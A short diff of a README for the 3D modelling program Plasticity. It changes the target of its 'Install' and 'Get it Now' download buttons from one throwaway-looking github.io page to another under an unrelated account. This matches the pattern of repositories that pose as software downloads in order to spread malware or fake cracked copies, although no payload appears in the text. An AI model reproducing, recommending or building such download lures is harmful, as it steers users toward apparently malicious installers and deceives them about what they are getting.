@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://jjfhjfk3858.github.io/.github/plasticity)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://poke-pokemon.github.io/.github/plasticity)
 
 </div>
 
@@ -81,7 +81,7 @@ Plasticity occupies a specific and previously underserved market position — pr
 
 <p align="center">
 
-[![Get it Now Plasticity](https://img.shields.io/badge/Get_it_Now-0582CA?style=for-the-badge&logo=apple&logoColor=white)](https://jjfhjfk3858.github.io/.github/plasticity)
+[![Get it Now Plasticity](https://img.shields.io/badge/Get_it_Now-0582CA?style=for-the-badge&logo=apple&logoColor=white)](https://poke-pokemon.github.io/.github/plasticity)
 
 </p>
 
